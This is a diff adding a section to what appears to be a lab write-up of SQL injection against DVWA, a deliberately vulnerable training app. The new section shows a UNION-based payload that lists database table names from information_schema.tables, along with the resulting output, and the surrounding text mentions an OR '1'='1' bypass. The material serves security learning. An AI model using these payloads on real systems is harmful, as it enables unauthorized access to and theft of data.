@@ -62,3 +62,23 @@ The application is vulnerable — it returns database records directly.
   ```
 
 SQL logic was bypassed — `OR '1'='1'` returned **all rows**.
+
+# Discovering Database Tables
+
+### Payload to enumerate table names:
+
+```sql
+test2' AND 1=0 UNION SELECT NULL, table_name FROM information_schema.tables #
+```
+
+- DVWA returned names of internal database tables:
+
+  ```
+  Surname: guestbook
+  Surname: users
+  Surname: ALL_PLUGINS
+  ```
+
+Successfully extracted table names from `information_schema.tables`.
+
+---
